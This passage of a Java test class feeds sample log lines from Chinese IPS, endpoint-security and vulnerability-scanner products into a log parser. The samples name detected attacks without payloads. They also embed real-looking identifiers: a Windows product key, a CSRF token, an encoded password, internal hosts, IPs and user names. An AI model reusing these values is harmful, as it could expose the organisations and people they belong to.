      String data = "<12>2011-03-09 20:55:39 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The use of cpu is too high: 17.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 20:55:59 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The use of memory is too high: 26.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:15:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The system partition will be full: 5 used.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:15:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The software partition will be full: 50 used.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:15:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The syslog partition will be full: 60 used.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:15:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The database partition will be full: 50%d used.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:17:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The temperature of CPU [0] is too high: 51.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:17:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The temperature of mainboard [0] is too high: 41.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:19:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The fan is not existed.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:19:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The fan [1] does not work well.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:19:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The power [1] does not work well.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:19:31 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The CF card [1] does not work well.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:19:31 DPTECH %%--IPS/SNMP/6/SYSLOG(l): System cold start.";
      parse(botuEngine, data);
      data = "<12>2011-03-09 22:19:31 DPTECH %%--IPS/SNMP/6/SYSLOG(l): System warm start.";
      parse(botuEngine, data);
      data = "<29>2011-03-09 22:19:31 DPTECH %%--IPS/ifmd/5/SYSLOG(l): Interface eth0_1 is up";
      parse(botuEngine, data);
      data = "<29>2011-03-09 22:19:31 DPTECH %%--IPS/ifmd/5/SYSLOG(l): Interface eth0_1 is down.";
      parse(botuEngine, data);
      data = "<11>2000-01-06 01:35:17 DPTECH %%--IPS/WEB/3/OPERLOG(l): client-type(84):web;user-name(85):admin;host-ip(86):10.11.100.75;error-code(87):0;User [admin] logged in from IP address: [10.11.100.75].";
      parse(botuEngine, data);
      data = "<11>2000-01-06 01:35:58 DPTECH %%--IPS/WEB/3/OPERLOG(l): client-type(84):web;user-name(85):sfd;host-ip(86):10.11.100.75;error-code(87):1;User [sfd] logged in from IP address: [10.11.100.75] name or password is wrong.";
      parse(botuEngine, data);
      data = "<11>2000-01-06 01:35:32 DPTECH %%--IPS/WEB/3/OPERLOG(l): client-type(84):web;user-name(85):admin;host-ip(86):10.11.100.75;error-code(87):0;User: [admin] (IP address: 10.11.100.75 ) logged out.";
      parse(botuEngine, data);
      data = "Jul  5 13:26:44 2009 DPTECH %%UAG/ATTACK/0/DATALOG(l): log-type(1):attack-protect;event(2):block;attack-name(11):(352325536)死亡之Ping;protocol-name(17):(50333952)IP;ip-proto-id(18):1;source-ip(24):192.168.1.154;source-port(25):0;destination-ip(26):192.168.1.254;destination-port(27):0;block-reason(28):ABNORMITY-DETECTION;ifname-inside(29):eth0/2;ifname-outside(30):eth0/2;summary-count(33):1;summary-offset(34):0;";
      parse(botuEngine, data);
      data = "Jul  5 13:22:53 2009 DPTECH %%UAG/AV/3/DATALOG(l): log-type(1):av-protect;event(2):block;av-name(15):(488647691)Net-Worm.Win32.Nimda.ef;protocol-name(17):(84021124)FTP Data;ip-proto-id(18):6;source-ip(24):1.1.1.2;source-port(25):1530;destination-ip(26):2.2.2.2;destination-port(27):2247;block-reason(28):ABNORMITY-DETECTION;ifname-inside(29):eth0/1;ifname-outside(30):unknown;summary-count(33):1;summary-offset(34):0;";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //360终端检测v10.0
  public void testEps360v10() {
    String parserFile = "./resources/parsers/eps_360_skylar[v10.0]_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<8>Jun 23 17:08:12 client_info {\"HOSTID\":1025,\"CMPNAME\":\"ZHAXIANJUE\",\"IPADDR\":\"192.168.110.227\",\"MACADDR\":\"00-E0-4C-E6-80-8B,74-2F-68-0B-D0-41\",\"GROUPID\":\"fbe680fb7a4a46f5959390cdaefb0ff0\",\"OSVER\":\"Windows 7\",\"OSVER_DETAIL\":\"FHGJGOGEGPHHHDCADHCAFFGMHEGJGNGBHEGF\",\"OSTYPE\":\"64位操作系统\",\"SERVICEPACK\":1,\"LOGONUSER\":\"zhaxj\",\"DOMAINFLAG\":1,\"DOMAIN\":\"huaye.local\",\"LASTCONNECTTIME\":1655942374,\"LASTDISCONNECTTIME\":1655890768,\"IDENTITYNUM\":1,\"PRODUCTVER\":66531,\"TRUEIPADDR\":-1062703389,\"TRUEMACADDR\":\"00-E0-4C-E6-80-8B\",\"ISDEL\":0,\"CHILDIDENTITYNUM\":0,\"CLIENT_ID\":\"04018499\",\"CLIENT_HARDWAREID\":\"EBEBDADADADADADADADADADADADADADADBDFDDDHCNFEGPCAGCGFCAGGGJGMGMGFGECAGCHJCAEPCOEFCOENCO\",\"REGISTERTIMES\":null,\"CLIENT_TYPE\":0,\"ISLOADDRIVER\":null,\"AMENDIPFLAG\":null,\"IEVER\":\"11\",\"ACCOUNT_ID\":null,\"ACCOUNT_FLAG\":null,\"MASTER_SN\":\"\",\"HARDWARE_THUMBPRINT\":\"617EAE68AEB2B378\",\"CUSTEMED_TYPE\":null,\"CLIENT_STATUS\":1,\"OS_PLATFORM_TYPE\":1,\"UNACTIVATED\":0,\"UNACCREDITED\":0,\"UNINST_TIME\":null,\"WST_USERNAME\":null,\"DEFAULTWEB\":\"internet explorer\",\"SPECVER\":null,\"ISTCM\":null,\"ANTIVIRUS\":\"360终端安全管理系统\",\"ANTIVIRUSLIB\":\"10.0.2.4262\",\"ANTIVIRUSLIBVER\":\"2022-06-20\",\"ANTIVIRUSUPDATE\":0,\"OSNAME\":\"Microsoft Windows 7 旗舰版 \",\"OSVERSION\":\"6.1.7601 Service Pack 1 Build 7601\",\"CLIENTINFO_NAME\":\"AMD FP3 To be filled by O.E.M.\",\"CLIENT_CMPTYPE\":\"Windows\",\"M2\":\"4e1654a780156e65c3bf4049c785b1c479ccc5922bd0\",\"SHOWSDMGR\":\"0\",\"UPSDMGR\":\"1\",\"UPSDMGRTIME\":1655961451,\"OSVERCODE\":\"2Y4WT-DHTBF-Q6MMK-KYK6X-VKM6G\",\"XC_KERNEL_VERSION\":null,\"XC_SN\":null,\"XC_LAN\":null,\"XC_DISK_SERIALNUM\":null,\"XC_CPUTYPE\":null,\"IPV6DUID\":\"00010001287ee3d800e04ce6808b\",\"GROUPNAME\":\"项目部\"}";
      parse(botuEngine, data);
      data = "<8>Jun 28 01:04:47 syn_user_log {\"NUM_ID\":8,\"time\":1656338400,\"ip\":\"172.16.2.10\",\"state\":\"同步成功\"}";
      parse(botuEngine, data);
      data = "<8>Aug 14 01:00:36 website_audit {NUM_ID=1372, AUDIT_TIME=1660323299, ALARM_WEBSITE_VIOLATE_WEB=<a href=\"http://tconf2.f.360.cn/qconf.php\" target=\"_blank\">tconf2.f.360.cn/qconf.php</a>, HOSTID=1115, SOLU_ID=1d6ee5a97a76440b813878af3713e1fd, SOLU_VER=4, ALARM_LEVEL=, CMPNAME=PC-20191115NDPQ, GROUPNAME=新客户机组, IPADDR=172.18.67.12, MACADDR=74-27-EA-19-A4-F0, OSVER=Windows 10, OSTYPE=64位操作系统, CLIENT_TYPE=内网客户端, PHOTO_POINT_ID=1d6ee5a97a76440b813878af3713e1fd, PHOTO_POINT_VERSION=4, NAME=监控}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testTopsecTopDesk() {
    String parserFile = "./resources/parsers/eps_topsec_topdesk[3.1.0.33]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<13>Jul 21 08:58:30 WIN-EC5ILHJGK7F <message><header><id>E11E9049-4356-9BEA-6E8F-DBE0ABA79585</id><from>tdsvr.topdesk</from><to>tdsvr.log</to><type>AgentLog</type><gentime>2022-07-21 08:58:30</gentime><sendtime>2022-07-21 08:58:30</sendtime></header><body><Log type=\"PNP\"><Time>2022-07-21 08:58:19.0</Time><Sender type=\"Agent\">E11E9049-4356-9BEA-6E8F-DBE0ABA79585</Sender><Trigger type=\"策略\" name=\"设备监控\">6717</Trigger><Subject class=\"计算机\" name=\"DESKTOP-SQRMS1J\"><用户账号>dell</用户账号></Subject><Action>插入</Action><Object class=\"设备\" name=\"USB Attached SCSI (UAS) Mass Storage Device\"><Device><设备实例>USB/VID_0BC2&amp;amp;PID_231A/MSFT30NAA4ZTZ7</设备实例><类GUID>{4d36e97b-e325-11ce-bfc1-08002be10318}</类GUID><类>USB SCSIAdapter</类><状态>启用</状态><设备描述>USB Attached SCSI (UAS) Mass Storage Device</设备描述><厂商>USB Attached SCSI (UAS) Compatible Device</厂商><硬件ID>USB/VID_0BC2&amp;amp;PID_231A&amp;amp;REV_0710;USB/VID_0BC2&amp;amp;PID_231A;</硬件ID><兼容ID>USB/Class_08&amp;amp;SubClass_06&amp;amp;Prot_62;USB/Class_08&amp;amp;SubClass_06;USB/Class_08;</兼容ID><父系>USB/ROOT_HUB30/4&amp;amp;22F9C9AE&amp;amp;0&amp;amp;0</父系></Device></Object><Level>5</Level><Handle>允许</Handle><Reason></Reason><Result>已放行</Result></Log></body></message>";
      parse(botuEngine, data);
      data = "<13>Jul 21 08:58:30 WIN-EC5ILHJGK7F <message><header><id>E11E9049-4356-9BEA-6E8F-DBE0ABA79585</id><from>tdsvr.topdesk</from><to>tdsvr.log</to><type>AgentLog</type><gentime>2022-07-21 08:58:30</gentime><sendtime>2022-07-21 08:58:30</sendtime></header><body><Log type=\"UDEV\"><Time>2022-07-21 08:58:36.0</Time><Sender type=\"Agent\">E11E9049-4356-9BEA-6E8F-DBE0ABA79585</Sender><Trigger type=\"策略\" name=\"移动存储安全\">6710</Trigger><Subject class=\"计算机\" name=\"DESKTOP-SQRMS1J\"><用户账号>dell</用户账号></Subject><Action>插入</Action><Object class=\"USB硬盘\" name=\"Seagate Expansion\"><插入时间>2022/7/21 8:33:16</插入时间><厂商>Seagate</厂商><型号>Expansion</型号><序列号>NAA4ZTZ7</序列号><容量>1863.02GB</容量></Object><Level>5</Level><Handle>允许</Handle><Reason></Reason><Result>成功</Result></Log></body></message>";
      parse(botuEngine, data);
      data = "<12>Jul 21 14:59:58 WIN-EC5ILHJGK7F <message><header><id>E11E9049-4356-9BEA-6E8F-DBE0ABA79585</id><from>tdsvr.topdesk</from><to>tdsvr.log</to><type>AgentLog</type><gentime>2022-07-21 14:59:58</gentime><sendtime>2022-07-21 14:59:58</sendtime></header><body><Log type=\"BOOTRECORD\"><Time>2022-07-21 14:34:13.0</Time><Sender type=\"Agent\">E11E9049-4356-9BEA-6E8F-DBE0ABA79585</Sender><Trigger type=\"模块\" name=\"系统监控\"></Trigger><Subject class=\"模块\" name=\"系统监控\"><计算机>DESKTOP-SQRMS1J</计算机><用户账号></用户账号></Subject><Action>记录上一次异常关机</Action><Object class=\"时间\" name=\"2022/07/14 15:54:14\"><开机时间>2022/07/14 15:54:14</开机时间><最后运行时间>2022/07/14 15:54:14</最后运行时间></Object><Level>4</Level><Handle></Handle><Reason></Reason><Result></Result></Log></body></message>";
      parse(botuEngine, data);
      data = "<13>Jul 21 15:00:58 WIN-EC5ILHJGK7F <message><header><id>E11E9049-4356-9BEA-6E8F-DBE0ABA79585</id><from>tdsvr.topdesk</from><to>tdsvr.log</to><type>AgentLog</type><gentime>2022-07-21 15:00:58</gentime><sendtime>2022-07-21 15:00:58</sendtime></header><body><Log type=\"UFS\"><Time>2022-07-21 15:00:03.0</Time><Sender type=\"Agent\">E11E9049-4356-9BEA-6E8F-DBE0ABA79585</Sender><Trigger type=\"策略\" name=\"移动存储安全\">6710</Trigger><Subject class=\"进程\" name=\"svchost.exe\"><pid>8608</pid><计算机>DESKTOP-SQRMS1J</计算机><用户账号>NT AUTHORITY/SYSTEM</用户账号><进程路径>C:/Windows/System32/svchost.exe</进程路径></Subject><Action>新建</Action><Object class=\"文件夹\" name=\"AadRecoveryPasswordDelete\"><File><磁盘类型>USB硬盘</磁盘类型><磁盘ID></磁盘ID><路径>H:/System Volume Information/AadRecoveryPasswordDelete</路径></File></Object><Level>5</Level><Handle>允许</Handle><Reason></Reason><Result>成功</Result></Log></body></message>";
      parse(botuEngine, data);
      data = "<12>Jul 27 02:01:44 WIN-EC5ILHJGK7F <message><header><id>E1E472A5-EC1D-F77A-46FD-3ECADABA3605</id><from>tdsvr.topdesk</from><to>tdsvr.log</to><type>AgentLog</type><gentime>2022-07-27 02:01:44</gentime><sendtime>2022-07-27 02:01:44</sendtime></header><body><Log type=\"MONITORBOOT\"><Time>2022-07-27 02:00:44.0</Time><Sender type=\"Agent\">E1E472A5-EC1D-F77A-46FD-3ECADABA3605</Sender><Trigger type=\"\" name=\"\"></Trigger><Subject 用户=\"银西节点视频终端\"></Subject><Action>在非指定时间开机</Action><Object 客户端IP=\"10.124.46.80\" 开机时间=\"2022-07-27 02:00:44\"></Object><Level>4</Level><Handle>报警</Handle><Reason>用户在非指定时间段内(正常时间段为：05:00:00,19:00:00)开机</Reason><Result>成功</Result></Log></body></message>";
      parse(botuEngine, data);
      data = "<13>Feb  9 06:49:14 WIN-FUDM589B9PB <message><header><id>E189CBAE-8D57-1354-C0D3-BB2AD6D6C222</id><from>tdsvr.topdesk</from><to>tdsvr.log</to><type>AgentLog</type><gentime>2023-02-09 06:49:14</gentime><sendtime>2023-02-09 06:49:14</sendtime></header><body><Log type=\"SOFTCHANGE\"><Time>2023-02-09 06:49:03.0</Time><Sender type=\"\">E189CBAE-8D57-1354-C0D3-BB2AD6D6C222</Sender><Trigger type=\"\" name=\"\"></Trigger><Subject class=\"\" name=\"\"/><Action></Action><Object class=\"模块\" name=\"用户端软件变更\"><IP>10.149.73.12</IP><变更信息>安装NVIDIA 3D Vision 控制器驱动程序 390.41, 时间为：20191111</变更信息></Object><Level>5</Level><Handle></Handle><Reason></Reason><Result></Result></Log></body></message>";
      parse(botuEngine, data);
      data = "<13>Feb  9 02:01:04 WIN-FUDM589B9PB <message><header><id>6C31DBAD-907E-448D-8322-5E6BB117CAF7</id><from>tdsvr.topdesk</from><to>tdsvr.log</to><type>AgentLog</type><gentime>2023-02-09 02:01:04</gentime><sendtime>2023-02-09 02:01:04</sendtime></header><body><Log type=\"SERVERSTATUSCHANGE\"><Time>2023-02-09 02:01:03.0</Time><Sender type=\"\"></Sender><Trigger type=\"\" name=\"\"></Trigger><Subject host=\"10.221.24.27\" port=\"8443\"></Subject><Action>startup</Action><Object><主机IP>10.221.24.27</主机IP><端口>8443</端口><描述>IP为：10.221.24.27;端口号为：8443的主机startup</描述></Object><Level>5</Level><Handle>启动</Handle><Reason>IP为：10.221.24.27;端口号为：8443的主机startup</Reason><Result>服务器状态变更</Result></Log></body></message>";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAsiainfoTda() {
    String parserFile = "./resources/parsers/dpi_asiainfo_tda_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<158>CEF:0|Asiainfo security|TDA|3.83.1023|100119|SECURITY_RISK_DETECTION|2|ptype=IDS dvc=192.168.0.42 deviceMacAddress=D4:AE:52:90:97:67 dvchost=localhost deviceGUID=442696EDA97F-4CE6A9D9-C867-7C41-2499 rt=Aug 03 2022 11:10:22 GMT+08:00 appGroup=SQL app=MSSQL vLANId=4095 deviceDirection=1 dhost=192.1.2.112 dst=192.1.2.112 dpt=57133 dmac=00:e0:0f:85:3f:b0 shost=yscsvr src=192.168.0.188 spt=1433 smac=b0:26:28:bc:9a:69 malType=OTHERS fileType=-65536 fsize=0 ruleId=554 ruleName=Successful log on to MSSQL service deviceRiskConfidenceLevel=3 cn3Label=深度威胁发现设备_PotentialRisk cn3=1 cs4Label=深度威胁发现设备_SrcGroup cs4=缺省 cs5Label=深度威胁发现设备_SrcZone cs5=1 cs10Label=深度威胁发现设备_DstZone cs10=0 cs6Label=深度威胁发现设备_DetectionType cs6=1 pComp=NCIE act=not blocked cn4Label=深度威胁发现设备_ThreatType cn4=2 peerIp=192.1.2.112 interestedIp=192.168.0.188 cnt=3 cn5Label=AggregatedCount cn5=1 evtCat=Authentication evtSubCat=Login Success cn2Label=APT Related cn2=0 pAttackPhase=Asset and Data Discovery externalId=2557358 compressedFileType=-65536 compressedFileHash=0000000000000000000000000000000000000000 hostSeverity=1 reason=[\"IP address: 192.1.2.112\"]";
      /*parse(botuEngine, data);
      data = "<158>CEF:0|Asiainfo security|TDA|3.83.1023|100119|SECURITY_RISK_DETECTION|2|ptype=IDS dvc=192.168.0.42 deviceMacAddress=D4:AE:52:90:97:67 dvchost=localhost deviceGUID=442696EDA97F-4CE6A9D9-C867-7C41-2499 rt=Aug 03 2022 11:05:20 GMT+08:00 appGroup=CIFS app=SMB vLANId=4095 deviceDirection=1 dhost=ltpos06 dst=192.168.8.36 dpt=1525 dmac=00:e0:0f:85:3f:b0 shost=7server src=192.168.0.7 spt=445 smac=40:f2:e9:a1:30:4b malType=OTHERS fileType=-65536 fsize=0 ruleId=38 ruleName=12 unsuccessful logon attempts - SMB deviceRiskConfidenceLevel=3 cn3Label=深度威胁发现设备_PotentialRisk cn3=1 cs4Label=深度威胁发现设备_SrcGroup cs4=缺省 cs5Label=深度威胁发现设备_SrcZone cs5=1 cs9Label=深度威胁发现设备_DstGroup cs9=缺省 cs10Label=深度威胁发现设备_DstZone cs10=1 cs6Label=深度威胁发现设备_DetectionType cs6=1 pComp=NCIE act=not blocked cn4Label=深度威胁发现设备_ThreatType cn4=2 peerIp=192.168.0.7 interestedIp=192.168.8.36 cn2Label=APT Related cn2=0 externalId=2557326 compressedFileType=-65536 compressedFileHash=0000000000000000000000000000000000000000 hostSeverity=1 reason=[\"IP address: 192.168.0.7\"]";
      parse(botuEngine, data);
      data = "<158>CEF:0|Asiainfo security|TDA|3.83.1023|300999|The syslog server settings have been changed|2|dvc=192.168.0.42 dvcmac=D4:AE:52:90:97:67 dvchost=localhost deviceExternalId=442696EDA97F-4CE6A9D9-C867-7C41-2499 rt=Aug 03 2022 10:50:09 GMT+08:00";
      parse(botuEngine, data);
      data = "<158>CEF:0|Asiainfo security|TDA|3.83.1023|554|Successful log on to MSSQL service|2|dvc=192.168.0.42 dvcmac=D4:AE:52:90:97:67 dvchost=localhost deviceExternalId=442696EDA97F-4CE6A9D9-C867-7C41-2499 rt=Aug 03 2022 10:42:24 GMT+08:00 app=MSSQL deviceDirection=1 dhost=bogon dst=192.168.12.86 dpt=52636 dmac=00:e0:0f:85:3f:b0 shost=yscsvr src=192.168.0.188 spt=1433 smac=b0:26:28:bc:9a:69 fileType=-65536 fsize=0 act=not blocked cn3Label=Threat Type cn3=2 destinationTranslatedAddress=192.168.12.86 sourceTranslatedAddress=192.168.0.188 cnt=10 cat=Authentication cs6Label=pAttackPhase cs6=Asset and Data Discovery flexNumber1Label=vLANId flexNumber1=4095";
      parse(botuEngine, data);
      data = "<158>CEF:0|Asiainfo security|TDA|3.83.1023|38|12 unsuccessful logon attempts - SMB|2|dvc=192.168.0.42 dvcmac=D4:AE:52:90:97:67 dvchost=localhost deviceExternalId=442696EDA97F-4CE6A9D9-C867-7C41-2499 rt=Aug 03 2022 10:32:36 GMT+08:00 app=SMB deviceDirection=1 dhost=ltpos06 dst=192.168.8.36 dpt=1466 dmac=00:e0:0f:85:3f:b0 shost=7server src=192.168.0.7 spt=445 smac=40:f2:e9:a1:30:4b fileType=-65536 fsize=0 act=not blocked cn3Label=Threat Type cn3=2 destinationTranslatedAddress=192.168.0.7 sourceTranslatedAddress=192.168.8.36 flexNumber1Label=vLANId flexNumber1=4095";
      parse(botuEngine, data);
      data = "<158>CEF:0|Asiainfo security|TDA|3.83.1023|2871|Possible Directory Traversal Exploit Attempted - URI Variable/URI Path - HTTP (Request)|4|dvc=10.100.55.252 dvcmac=B4:96:91:30:56:82 dvchost=ZJLSH-ZWY-CB-5F-TDA-01 deviceExternalId=D3C76787A1C9-455E904E-CE8E-3482-8B48 rt=Aug 16 2022 10:47:35 GMT+08:00 app=HTTP deviceDirection=0 dhost=59.202.229.130 dst=59.202.229.130 dpt=81 dmac=04:d7:a5:41:36:7c shost=10.53.134.121 src=10.53.134.121 spt=36148 smac=90:5d:7c:45:43:f6 cs3Label=HostName_Ext cs3=59.202.229.130 fileType=-65536 fsize=0 requestClientApplication=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54 act=not blocked cn3Label=Threat Type cn3=3 destinationTranslatedAddress=10.53.134.121 sourceTranslatedAddress=59.202.229.130 cnt=2 cat=Exploit cs6Label=pAttackPhase cs6=Point of Entry flexNumber1Label=vLANId flexNumber1=4095";
      parse(botuEngine, data);
      data = "<158>CEF:0|Asiainfo security|TDA|3.83.1023|4689|POSSIBLE SQL INJECT RCE EXPLOIT - HTTP (SEN) - Variant 2|4|dvc=10.100.55.252 dvcmac=B4:96:91:30:56:82 dvchost=ZJLSH-ZWY-CB-5F-TDA-01 deviceExternalId=D3C76787A1C9-455E904E-CE8E-3482-8B48 rt=Aug 14 2022 11:59:53 GMT+08:00 app=HTTP deviceDirection=1 dhost=172.28.28.129 dst=172.28.28.129 dpt=8004 dmac=90:5d:7c:45:43:f6 shost=10.53.150.56 src=10.53.150.56 spt=41266 smac=04:d7:a5:41:36:7c cs3Label=HostName_Ext cs3=10.100.239.11 fileType=-65536 fsize=0 requestClientApplication=Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 act=not blocked cn3Label=Threat Type cn3=3 destinationTranslatedAddress=172.28.28.129 sourceTranslatedAddress=10.53.150.56 cnt=1 cat=Exploit cs6Label=pAttackPhase cs6=Point of Entry flexNumber1Label=vLANId flexNumber1=4095";
      parse(botuEngine, data);
      data = "<158>CEF:0|Asiainfo security|TDA|3.83.1023|561|A default user attempted to log on to MySQL service|2|dvc=10.100.55.252 dvcmac=B4:96:91:30:56:82 dvchost=ZJLSH-ZWY-CB-5F-TDA-01 deviceExternalId=D3C76787A1C9-455E904E-CE8E-3482-8B48 rt=Aug 15 2022 11:47:02 GMT+08:00 app=MYSQL deviceDirection=0 dhost=10.53.129.216 dst=10.53.129.216 dpt=3306 dmac=04:d7:a5:41:55:36 shost=172.28.47.51 src=172.28.47.51 spt=35564 smac=90:5d:7c:45:43:f6 fileType=-65536 fsize=0 act=not blocked cn3Label=Threat Type cn3=2 destinationTranslatedAddress=172.28.47.51 sourceTranslatedAddress=10.53.129.216 suid=root cnt=6 cat=Authentication cs6Label=pAttackPhase cs6=Asset and Data Discovery flexNumber1Label=vLANId flexNumber1=4095";
      parse(botuEngine, data);
      data = "<158>CEF:0|Asiainfo security|TDA|3.83.1023|300999|Client from 10.100.55.250 gets Virtual Analyzer Feedback.|2|dvc=10.100.55.252 dvcmac=B4:96:91:30:56:82 dvchost=ZJLSH-ZWY-CB-5F-TDA-01 deviceExternalId=D3C76787A1C9-455E904E-CE8E-3482-8B48 rt=Aug 18 2022 14:27:19 GMT+08:00";
      parse(botuEngine, data);*/
      data = "<46>Feb 01 10:20:22 ZJLSH-ZWY-CB-5F-AE-02 CEF:0|Asiainfo Security|AIS Edge EE|7.0.0.1.2282|2|IPS|6|dvc=10.100.55.251 src=172.28.31.186 dst=10.53.151.231 malName=-- malType=OTHER suser=-- dpt=18080 proto=6 application_id=67 application_attributeId=0 act=2 ruleName=Default type=2 ruleId=103044094 ipsruleName=Spring Cloud Function SpEL 表达式注入漏洞 fname=functionRouter domain=10.53.151.231:18080 request=10.53.151.231:18080/functionRouter wrsScore=0 urlCat=-- urlCategory2=-- urlCategory3=-- urlCategory4=-- spt=38633 direction=1 mailSender=-- mailRecipient= mailMsgSubject= fileHash= from=-- repeatTimes=-- log_type=Violation log threatName=exploit threatType=exploit";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAsiainCUTM() {
    String parserFile = "./resources/parsers/cutm_asiainfo_deepsecurity[10.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<134>Aug  3 13:58:21 WIN-N3VCC7U1BQE DSM: EVENTNUMBER=710 TITLE=Events Retrieved TARGET=WIN-18ECSCNLNSA (??) ACTIONBY=System DESCRIPTION=Description Omitted TAGS=";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAsiainDeepEdge() {
    String parserFile = "./resources/parsers/ips_asiainfo_deepedge_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<46>[Sysevt log] hostname=bogon; log_time=2022-08-03 12:48:05 +0800; type=imssd; description=服务已停止。";
      parse(botuEngine, data);
      data = "<46>[Violation log] log time=2016-01-01 09:40:50 +0800; host name=DE900; source address=192.168.1.2; source user=--; destination address=221.229.167.44; destination port=80; protocol=6; application id=67; application attribute id=0; action=2; rule name=Block Http; type=1; ips rule=--; file name=--; malware name=--; host=--; url=--; wrs score=0; url category1=--; url category2=--; url category3=--; url category4=--; source port=53474; direction=0;mail sender=; mail recipient=; mail subject=";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testSangforYJ() {
    String parserFile = "./resources/parsers/vulnscanner_sangfor_yj[3.0.10]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<36>2022-08-02 17:43:13,644 - 192.168.10.151 - WARNING - user：admin - ip: 192.168.10.81 - behavior: 登录 - object: 登录 - 用户admin 登录成功 - {\"loginType\": \"account\", \"password\": \"***\", \"rand\": \"by1hcq\", \"user\": \"admin\", \"pwd_text\": \"dTI0/9a/SynX2jRocC+V5g==\"} - /mirror/auth/login";
      parse(botuEngine, data);
      data = "<36>2022-08-01 17:31:27,670 - 192.168.10.151 - WARNING - user：admin - ip: 192.168.10.81 - behavior: 资产操作 - object: 添加资产 - 添加资产(192.168.10.151) - {\"middleware\": null, \"ip\": \"192.168.10.151\", \"contact_people\": null, \"hostname\": null, \"device_type\": \"\\u5b89\\u5168\\u8bbe\\u5907\", \"department\": null, \"os\": null, \"telephone\": null, \"device_sub_type\": \"\\u5b89\\u5168\\u5ba1\\u8ba1\", \"company\": null, \"is_important\": 1, \"port_services_software\": null, \"is_monitor\": null, \"mac\": null, \"hostdomain\": null, \"business_group\": null} - /mirror/asset/add";
      parse(botuEngine, data);
      data = "<36>2022-08-02 17:17:21,870 - 192.168.10.151 - WARNING - user：admin - ip: 192.168.10.81 - behavior: 日志操作 - object: 日志导出 - 用户操作日志导出成功 - {\"keyword\": \"\", \"operation_type\": \"\\u5168\\u90e8\", \"begin_time\": \"0\", \"operation_result\": \"2\", \"end_time\": \"0\", \"is_deleted\": \"0\", \"csrf_token\": \"IjBkYTA0MjgyYjUyZDM3ZTRiZmQ3M2M0NjMxZDUwZTY1NWRlYWFlNzgi.Yujrmg.Sm5xpthUq_bTlgDFP9MEuwaUah4\", \"user_name\": \"\"} - /mirror/log_manage/export_or_delete_log";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testTrendNVWE() {
    String parserFile = "./resources/parsers/antivirus_trend_nvwe_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
